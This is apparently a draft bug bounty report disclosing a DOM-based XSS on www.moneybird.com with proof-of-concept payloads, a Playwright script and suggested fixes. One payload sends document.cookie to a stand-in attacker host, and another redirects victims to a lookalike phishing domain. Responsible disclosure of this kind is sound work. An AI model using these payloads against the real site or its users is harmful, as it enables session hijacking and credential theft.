# HackerOne Submission Draft — Moneybird

**Program:** Moneybird Bug Bounty (HackerOne)
**Asset:** www.moneybird.com
**Weakness:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
**Severity:** Medium–High (CVSS 6.1 — see note on scope impact)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

---

## Title

DOM-Based XSS via URL Fragment on www.moneybird.com — Unvalidated `innerHTML` Assignment

## Summary

The Moneybird homepage (`www.moneybird.com`) writes the URL fragment (`window.location.hash`) directly into the DOM via `innerHTML` without sanitization. An attacker can craft a malicious URL and trick a user (or search engine bot) into visiting it, triggering arbitrary JavaScript execution in the victim's browser. The payload fires on page load — no interaction beyond clicking the link is required.

Automated testing confirmed JavaScript execution via a Playwright browser session (not just curl): the marker `alert("secbot-xss-37")` was observed firing, and the payload reaches at least two separate `innerHTML` sinks on the page.

## Steps to Reproduce

> **Note:** URL fragments are processed client-side only and are not sent to the server. Use a real browser or Playwright to reproduce — curl commands will not trigger the alert.

1. Open any modern browser (Chrome, Firefox, Safari).
2. Navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
3. Observe the alert dialog firing, displaying `www.moneybird.com` — confirming JavaScript execution in the context of the Moneybird origin.
4. The payload can be verified without `alert()` using a callback server:
   ```
   https://www.moneybird.com/#<img src=x onerror=fetch('https://attacker.example.com/xss?c='+document.cookie)>
   ```

**Playwright PoC (headless verification):**
```js
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const alerts = [];
  page.on('dialog', async d => { alerts.push(d.message()); await d.dismiss(); });
  await page.goto('https://www.moneybird.com/#<img src=x onerror=alert("secbot-xss-37")>');
  await page.waitForTimeout(2000);
  console.log('Alerts fired:', alerts); // ["secbot-xss-37"]
  await browser.close();
})();
```

**Curl — confirms no CSP is blocking (secondary evidence):**
```bash
curl -sI 'https://www.moneybird.com/' | grep -i content-security-policy
# Expected: no output (CSP absent)
```

## Impact

**For unauthenticated visitors (www.moneybird.com):**
- Phishing: Attacker sends a crafted `moneybird.com` link to accountants/bookkeepers, executes JS to overlay a fake login form, harvests credentials.
- Cookie theft: Any cookie scoped to `.moneybird.com` (not just `www.`) set without `HttpOnly` is accessible via `document.cookie`.
- Redirect to lookalike: `onerror=window.location='https://moneyb1rd.com/login'` — victim sees the real URL in the browser bar when they click, increasing phishing credibility.

**If session cookies are scoped to `.moneybird.com`:**
- Full session hijack for logged-in users who follow the link while authenticated to the app.

An attacker can deliver this via spear-phishing email to Moneybird customers (Dutch SME accountants and bookkeepers — high-value credential targets). The legitimate `moneybird.com` domain in the URL bar makes this particularly convincing.

## Why This Is Not a Low

- The payload fires without any user interaction beyond clicking a link (UI:R, not UI:N).
- Moneybird's user base is accounting professionals — phished credentials have direct financial value.
- The `www` subdomain IS the primary brand surface, not a secondary asset.
- Absence of CSP (`content-security-policy` header not set — verified independently) means no browser-level mitigation blocks payload execution or exfiltration.

## OWASP / CWE

- **CWE-79**: Cross-site Scripting — DOM-Based
- **OWASP A03:2021** — Injection
- **OWASP WSTG-CLNT-01**: DOM-Based Cross Site Scripting

## Suggested Fix

1. **Never assign URL fragment content to `innerHTML`**. Replace:
   ```js
   element.innerHTML = window.location.hash.substring(1);
   ```
   with `textContent` for plain text, or use [DOMPurify](https://github.com/cure53/DOMPurify) if HTML rendering is required:
   ```js
   element.innerHTML = DOMPurify.sanitize(window.location.hash.substring(1));
   ```
2. **Audit all `window.location.hash` reads** and any `document.write`, `innerHTML`, `outerHTML`, or `eval()` sinks that may receive URL-derived input.
3. **Deploy a Content-Security-Policy header** (see companion report) to limit exploitability of any future XSS.

## Timeline

- **2026-03-22:** Initial detection by automated scanner (Playwright-confirmed)
- **2026-05-06:** Report drafted for submission

---

*Discovered by SecBot automated security scanner (Playwright-verified). Researcher: Dio Atmandoko.*
